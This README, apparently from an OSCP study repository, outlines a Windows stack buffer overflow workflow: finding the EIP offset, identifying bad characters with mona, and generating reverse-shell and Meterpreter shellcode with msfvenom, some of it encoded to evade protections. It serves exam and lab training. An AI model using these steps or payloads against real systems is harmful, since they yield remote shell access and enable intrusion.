# BoF4OSCP

TODO: run python3 setup.py IP PORT

## 1st step

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

run python3 offset.py
```

check on mona what is the EIP address
Take the EIP address that looks EIP 386F...

## 2nd step : pattern create

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337 (EIP ADDRESS)
[*] Exact match at offset 2003
```

## 3rd step : control EIP

edit eipOverwrite.py with the correct offset
run python3 eipOverwrite.py
check on Immunity if EIP is well overwritten with 4B4B4B

## 4th step : finding bad chars

python3 findingBadchars.py
right click on ESP, follow in dump

find the badchars using the following command
```
!mona compare -f c:\mona\bytearray.bin -a 005FF910(ESP ADDRESS)
```

## 5th step : fire up the reverse shell

We can also create an encoded one if some sort of protections are presents
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.11.1 LPORT=4444 EXITFUNC=thread -f c -b '\x00\x0a\x0d' (mybadchars)
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f c -b '\x00\x0a\x0d' (mybadchars)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.11.1 LPORT=4444 -e shikata_ga_nai -i 3 -f c -b '\x00\x0a\x0d' (mybadchars)
edit finalBuff
setup a listener
python3 finalbuff
```
